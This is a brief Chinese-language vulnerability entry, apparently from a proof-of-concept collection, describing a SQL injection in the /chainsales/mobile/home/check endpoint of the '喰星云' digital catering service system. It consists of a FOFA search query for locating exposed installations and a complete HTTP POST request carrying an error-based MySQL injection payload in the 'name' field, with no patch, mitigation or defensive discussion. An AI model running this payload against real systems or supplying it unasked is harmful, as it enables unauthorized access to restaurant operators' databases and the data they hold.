## 喰星云·数字化餐饮服务系统home_check存在SQL注入

## fofa
```
body="tmp_md5_pwd" || title=="喰星云·数字化餐饮服务系统" || body="请使用谷歌浏览器,点击进入下载地址"
```

## poc
```
POST /chainsales/mobile/home/check HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3055.69 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,MD5(1)))),0x7e),8475) AND '1%'='1&pwd=123
```
